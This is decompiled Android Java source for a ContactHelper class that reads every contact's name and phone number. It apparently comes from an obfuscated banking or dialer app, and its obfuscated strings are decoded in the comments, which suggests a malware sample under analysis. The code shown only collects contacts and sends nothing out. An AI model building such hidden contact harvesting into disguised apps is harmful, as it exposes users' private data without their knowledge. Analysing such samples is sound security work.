package com.wish.lmbank.dialer.utils;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import com.wish.lmbank.dialer.bean.ContactBean;

import java.util.ArrayList;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/dialer/utils/ContactHelper.class */
public class ContactHelper {
    private static ContactHelper callLogHelper;
    private ArrayList<ContactBean> arrayList = null;
    private Context context;

    private ContactHelper(Context context) {
        this.context = context;
    }

    public static ContactHelper getInstance(Context context) {
        if (callLogHelper == null) {
            callLogHelper = new ContactHelper(context);
        }
        return callLogHelper;
    }

    @SuppressLint("Range")
    private void b() {
        this.arrayList = new ArrayList<>();
        ContentResolver contentResolver = this.context.getApplicationContext().getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
//         String m5998 = bb7d7pu7.m5998("DQAaGQUIEDYHCAQM");
        String m5998 = "display_name";
//         String m59982 = bb7d7pu7.m5998("DQgdCFg");
        String m59982 = "data1";
//         Cursor query = contentResolver.query(uri, new String[]{m5998, m59982}, null, null, bb7d7pu7.m5998("DQAaGQUIEDYHCAQMSSomJSUoPSxJJyYqKDosSSg6Kg"));
        Cursor query = contentResolver.query(uri, new String[]{m5998, m59982}, null, null, "display_name COLLATE NOCASE ASC");
        if (query != null) {
            try {
                if (query.getCount() == 0) {
                    return;
                }
                query.moveToFirst();
                while (!query.isAfterLast()) {
                    ContactBean contactBean = new ContactBean();
                    contactBean.setDisplayName(query.getString(query.getColumnIndex(m5998)));
                    contactBean.setData1(query.getString(query.getColumnIndex(m59982)));
                    contactBean.setFirstLetter(query.getString(query.getColumnIndex(m5998)).charAt(0));
                    this.arrayList.add(contactBean);
                    query.moveToNext();
                }
                query.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public ArrayList<ContactBean> queryAll() {
        b();
        return this.arrayList;
    }
}
